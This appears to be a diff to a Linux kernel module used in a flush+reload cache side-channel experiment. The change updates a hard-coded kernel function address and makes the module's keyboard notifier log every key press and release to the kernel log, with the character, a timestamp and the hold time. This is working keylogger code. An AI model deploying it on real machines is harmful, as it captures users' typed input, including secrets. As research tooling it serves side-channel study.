@@ -10,13 +10,14 @@
 static struct notifier_block nb;
 static u64 start_time = 0;
 static int threshold = 155;
+static u64 last_press = 0;
 
 // execution time of the flush+reload thread in seconds
 #define EXEC_TIME 10
 
 #define LINE_SIZE 64
 
-#define FUNCTION_ADDRESS 0xffffffff9d48eac0
+#define FUNCTION_ADDRESS 0xffffffff90c8eac0
 
 u64 fenced_rdtsc(void) {
   u64 a, d;
@@ -53,10 +54,18 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
   struct keyboard_notifier_param *param =
       (struct keyboard_notifier_param *)data;
 
-  if (action == KBD_KEYSYM && param->down) { // Check if a key is pressed
+  if (action == KBD_KEYSYM) { // Check if a key is pressed
     u64 t1 = fenced_rdtsc();
-    printk(KERN_INFO "{\'key-char\': \'%c\', \'keystroke-time\': %llu}",
-           param->value - 64353 + 'a', t1 - start_time);
+    if (param->down) {
+      printk(KERN_INFO "{\'type\': \'press\', \'key-char\': \'%c\', "
+                       "\'keystroke-time\': %llu}",
+             param->value - 64353 + 'a', t1 - start_time);
+      last_press = t1;
+    } else {
+      printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \'%c\', "
+                       "\'keystroke-time\': %llu, \'keyhold\': %llu}",
+             param->value - 64353 + 'a', t1 - start_time, t1 - last_press);
+    }
   }
 
   return NOTIFY_OK;
